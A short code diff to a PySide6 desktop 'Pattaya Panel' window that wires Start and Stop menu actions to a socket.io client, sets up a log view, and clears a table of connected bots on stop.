@@ -2,6 +2,7 @@ from PySide6.QtCore import Qt,QModelIndex
 from PySide6.QtWidgets import QApplication, QMainWindow,QMessageBox,QTableView,QMenu
 from PySide6.QtGui import QIcon,QAction
 from core.info import PATTAYA_PANEL_VERSION
+from core.util import PattayaPanelUtil
 from designer.ui_main_window import Ui_MainWindow
 from model.bot_table_model import BotTableModel
 import qdarktheme
@@ -23,7 +24,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
 
         self.about_dialog = AboutWidget()
         
-
+        PattayaPanelUtil.setup(self.panel_log_text_browser)
         self.socket_io_client = socket_io_client
         self.bot_table_view.setShowGrid(False)
 
@@ -37,6 +38,9 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.actionLight.triggered.connect(self.enable_light_theme)
         self.actionAbout_Pattaya_Project.triggered.connect(self.about_pattaya_project)
         self.actionAbout_Qt.triggered.connect(self.about_qt)
+
+        self.actionStart.triggered.connect(self.start)
+        self.actionStop.triggered.connect(self.stop)
 
         self.socket_io_client.panel_received_online_bot_data.connect(self.update_online_bot)
 
@@ -90,3 +94,13 @@ class MainWindow(QMainWindow, Ui_MainWindow):
             return item
         else:
             return None
+
+
+    def start(self):
+        self.socket_io_client.start()
+        
+
+
+    def stop(self):
+        self.socket_io_client.stop()
+        self.bots_table_model.refresh([])
